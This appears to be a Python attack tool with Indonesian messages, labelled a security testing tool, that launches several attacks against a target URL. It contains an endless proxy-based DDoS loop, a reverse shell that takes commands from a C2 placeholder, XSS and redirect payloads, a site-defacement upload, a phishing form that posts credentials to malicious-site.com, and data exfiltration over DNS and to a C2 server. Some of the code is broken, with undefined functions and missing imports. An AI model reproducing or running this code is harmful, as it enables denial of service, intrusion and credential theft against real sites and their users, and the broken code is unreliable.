import random
import string
import logging
import time
import threading
import requests
from fake_useragent import UserAgent
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import base64
import dns.resolver
import socket
import subprocess
import os
import pyfiglet
from urllib.parse import quote
from concurrent.futures import ThreadPoolExecutor
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
import numpy as np
from sklearn.feature_extraction.text import CountVectorizer
from tensorflow.keras.models import load_model
import json

logo = '''
   _____       __    ___ 
  / ___/____ _/ /___/ (_)
  \__ \/ __ `/ / __  / / 
 ___/ / /_/ / / /_/ / /  
/____/\__,_/_/\__,_/_/   
'''

print(logo)

logging.basicConfig(filename='log_serangan.txt', level=logging.INFO, format='%(asctime)s - %(message)s', datefmt='%Y-%m-%d %H:%M:%S')

R = '\033[91m'
G = '\033[92m'
Y = '\033[93m'
B = '\033[94m'
M = '\033[95m'
C = '\033[96m'
N = '\033[0m'

def load_file(file_name):
    try:
        with open(file_name, 'r') as file:
            return [line.strip() for line in file.readlines()]
    except FileNotFoundError:
        logging.error(f"File {file_name} tidak ditemukan!")
        return []

USER_AGENTS = load_file('user_agents.txt')
PROXIES = load_file('proxies.txt')

def get_random_proxy():
    return random.choice(PROXIES) if PROXIES else None

def get_random_user_agent():
    ua = UserAgent()
    return ua.random if USER_AGENTS is None else random.choice(USER_AGENTS)

def create_session():
    session = requests.Session()
    session.headers.update({
        'User-Agent': get_random_user_agent(),
        'Referer': ''.join(random.choices(string.ascii_lowercase + string.digits, k=10)),
        'X-Forwarded-For': f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}",
    })
    
    retry_strategy = Retry(
        total=3,
        backoff_factor=1,
        status_forcelist=[500, 502, 503, 504],
        method_whitelist=["HEAD", "GET", "OPTIONS"]
    )
    
    adapter = HTTPAdapter(max_retries=retry_strategy)
    session.mount("http://", adapter)
    session.mount("https://", adapter)

    proxy = get_random_proxy()
    if proxy:
        session.proxies = {
            'http': proxy,
            'https': proxy,
        }
    return session

def encode_payload(payload):
    base64_encoded = base64.b64encode(payload.encode('utf-8')).decode('utf-8')
    hex_encoded = payload.encode('utf-8').hex()
    return base64_encoded, hex_encoded

def url_encode_payload(payload):
    return urllib.parse.quote(payload)

def load_ml_model():
    model = load_model('ml_model.h5')
    return model

def advanced_ml_waf_bypass(model, payload, config_path='config/config.json'):
    with open(config_path, 'r') as config_file:
        config = json.load(config_file)
        
    def preprocess_input(payload):
        max_length = config.get('max_payload_length', 256)
        normalized_payload = [ord(char) / 255.0 for char in payload[:max_length]]
        padded_payload = np.pad(normalized_payload, (0, max(0, max_length - len(normalized_payload))), 'constant')
        return np.array([padded_payload])

    def postprocess_output(output_vector):
        decoded_payload = ''.join([chr(min(255, max(0, int(x * 255)))) for x in output_vector.flatten()])
        return decoded_payload

    input_vector = preprocess_input(payload)
    crafted_vector = model.predict(input_vector)
    crafted_payload = postprocess_output(crafted_vector)
    return crafted_payload

def feedback_loop_based_bypass(url, session, model):
    raw_payload = "<script>alert('XSS')</script>"
    crafted_payload = advanced_ml_waf_bypass(model, raw_payload)
    
    headers = {
        'User-Agent': get_random_user_agent(),
        'X-Forwarded-For': f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}",
    }
    response = session.get(f"{url}?input={url_encode_payload(crafted_payload)}", headers=headers)
    
    if response.status_code != 200:
        print(f"{R}WAF Detected and Blocked Payload. Adjusting Payload...{N}")
        new_payload = "Updated Payload After WAF Detection"
        feedback_based_payload = advanced_ml_waf_bypass(model, new_payload)
        response = session.get(f"{url}?input={url_encode_payload(feedback_based_payload)}", headers=headers)

    if response.status_code == 200:
        print(f"{G}Bypass WAF successful on: {url}{N}")
    else:
        print(f"{R}Bypass failed at: {url}, status code: {response.status_code}{N}")

def ddos_attack(target_url, session, proxy_list):
    headers = {'User-Agent': get_random_user_agent()}
    while True:
        for proxy in proxy_list:
            session.proxies = {'http': proxy, 'https': proxy}
            try:
                response = session.get(target_url, headers=headers)
                if response.status_code == 200:
                    print(f"{M}DDoS Attack sent from: {proxy}{N}")
                time.sleep(random.uniform(0.1, 0.5))
            except Exception as e:
                print(f"{R}Error with proxy {proxy}: {e}{N}")
                continue

def deface_website(url, session):
    payload = """
    <html>
    <head><title>Hacked</title></head>
    <body><h1>Website Hacked!</h1><p>respect for haket</p></body>
    </html>
    """
    files = {'file': ('deface.html', payload, 'text/html')}
    response = session.post(url, files=files)
    if response.status_code == 200:
        print(f"{G}Website berhasil di-deface pada: {url}{N}")
    else:
        print(f"{R}Gagal deface pada: {url}, status code: {response.status_code}{N}")

def reconnaissance(target_url):
    session = create_session()
    try:
        response = session.get(target_url)
        if response.status_code == 200:
            print(f"{G}Berhasil melakukan reconnaissance pada: {target_url}{N}")
            print(f"{C}Response Headers: {response.headers}{N}")
            print(f"{C}Cookies: {response.cookies}{N}")
        else:
            print(f"{R}Reconnaissance gagal pada: {target_url}, status code: {response.status_code}{N}")
    except requests.exceptions.RequestException as e:
        print(f"{R}Error during reconnaissance: {e}{N}")

def reverse_shell():
    server_ip = 'YOUR_C2_SERVER_IP'
    server_port = 4444
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((server_ip, server_port))
    while True:
        command = sock.recv(1024).decode('utf-8')
        if command.lower() == 'exit':
            sock.close()
            break
        output = subprocess.run(command, shell=True, capture_output=True)
        sock.send(output.stdout + output.stderr)

def botnet_attack(target_url, session):
    bot_ips = ["192.168.0.101", "192.168.0.102", "192.168.0.103"]  # Bisa diperluas dengan botnet nyata
    for ip in bot_ips:
        try:
            session.proxies = {'http': f"http://{ip}", 'https': f"https://{ip}"}
            response = session.get(target_url)
            if response.status_code == 200:
                print(f"{M}Botnet attack successful from: {ip}{N}")
        except Exception as e:
            print(f"{R}Botnet error from {ip}: {e}{N}")
            continue

def polymorphic_payload_generator(payload):
    obfuscated_payload = ''.join(random.choice([char.upper(), char.lower()]) for char in payload)
    return quote(obfuscated_payload)

def self_healing_exploits():
    print(f"{Y}Exploit failed, adjusting payload...{N}")
    new_payload = "<script>window.location='http://malicious-site.com';</script>"
    return polymorphic_payload_generator(new_payload)

def fileless_exfiltration(data, key):
    encrypted_data = encrypt_data(data, key)
    covert_channel = encode_data_to_dns(encrypted_data)
    send_through_dns(covert_channel)

def send_through_dns(queries):
    for query in queries:
        try:
            dns.resolver.resolve(query, 'A')
            print(f"{G}Data sent through DNS: {query}{N}")
        except Exception as e:
            print(f"{R}Error during DNS tunneling: {e}{N}")

def reconnaissance_with_subdomain_scan(target_url):
    try:
        domain = target_url.split('//')[1].split('/')[0]
        result = dns.resolver.resolve(f"*.{domain}", 'A')
        print(f"{G}Subdomains found: {result}{N}")
    except dns.resolver.NoAnswer:
        print(f"{R}No subdomains found for {domain}{N}")
    except Exception as e:
        print(f"{R}Error during subdomain scan: {e}{N}")

def send_exfiltrated_data_to_c2(data, key):
    encrypted_data = encrypt_data(data, key)
    c2_ip = 'YOUR_C2_SERVER_IP'
    c2_port = 5555
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((c2_ip, c2_port))
    sock.send(encrypted_data)
    sock.close()
    print(f"{G}Data successfully sent to C2 server.{N}")

def encrypt_data(data, key):
    cipher = AES.new(key, AES.MODE_CBC)
    ct_bytes = cipher.encrypt(pad(data.encode(), AES.block_size))
    return cipher.iv + ct_bytes

def advanced_phishing_attack(target_url):
    phishing_payload = """
    <html>
    <head><title>Login</title></head>
    <body>
        <h1>Login to Your Account</h1>
        <form method="post" action="http://malicious-site.com/login">
            <input type="text" name="username" placeholder="Username" required><br><br>
            <input type="password" name="password" placeholder="Password" required><br><br>
            <input type="submit" value="Login">
        </form>
    </body>
    </html>
    """
    response = requests.post(target_url, data=phishing_payload)
    if response.status_code == 200:
        print(f"{G}Phishing attack successful on: {target_url}{N}")
    else:
        print(f"{R}Phishing failed at: {target_url}, status code: {response.status_code}{N}")

def bypass_waf_using_cloud_based_proxies(target_url):
    cloud_proxies = ["cloudproxy1.com", "cloudproxy2.com", "cloudproxy3.com"]  # Daftar proxy berbasis cloud
    for proxy in cloud_proxies:
        session = create_session()
        session.proxies = {'http': proxy, 'https': proxy}
        try:
            response = session.get(target_url)
            if response.status_code == 200:
                print(f"{G}Bypassed WAF using cloud proxy: {proxy}{N}")
        except requests.exceptions.RequestException as e:
            print(f"{R}Error with cloud proxy {proxy}: {e}{N}")

if __name__ == "__main__":
    print(pyfiglet.figlet_format("Advanced Web Attacker"))
    print(f"{M}Welcome to the Advanced Web Application Security Testing Tool!{N}")
    
    session = create_session()
    target_url = input(f"{Y}Masukkan URL target yang ingin diuji: {N}")
    key = b'{ubah menjadi secret kunci 16 digit'

    print(f"{B}Melakukan bypass WAF menggunakan payload canggih...{N}")
    payload = "<script>alert('XSS')</script>"
    crafted_payload = polymorphic_payload_generator(payload)
    session.get(f"{target_url}?input={crafted_payload}")

    print(f"{B}Meluncurkan serangan multi-vector...{N}")
    threading.Thread(target=ddos_attack, args=(target_url, session, PROXIES)).start()
    threading.Thread(target=botnet_attack, args=(target_url, session)).start()
    threading.Thread(target=reverse_shell).start()

    sensitive_data = "username=admin&password=1234"
    print(f"{B}Melakukan eksfiltrasi data dengan teknik fileless...{N}")
    dns_tunneling_data_exfiltration(sensitive_data, key)

    print(f"{B}Menggunakan exploit yang bisa memperbaiki diri sendiri...{N}")
    adjusted_payload = self_healing_exploits()
    session.get(f"{target_url}?input={adjusted_payload}")

    print(f"{B}Melakukan reconnaissance pada website target...{N}")
    reconnaissance(target_url)

    reconnaissance_with_subdomain_scan(target_url)

    print(f"{B}Melakukan defacing pada website target...{N}")
    deface_website(target_url, session)

    print(f"{B}Melakukan serangan phishing untuk mencuri kredensial...{N}")
    advanced_phishing_attack(target_url)

    print(f"{B}Melakukan bypass WAF menggunakan proxy berbasis cloud...{N}")
    bypass_waf_using_cloud_based_proxies(target_url)

    print(f"{B}Mengirim data yang dieksfiltrasi ke C2 server...{N}")
    send_exfiltrated_data_to_c2(sensitive_data, key)

    print(f"{M}Semua serangan selesai pada target: {target_url}{N}")
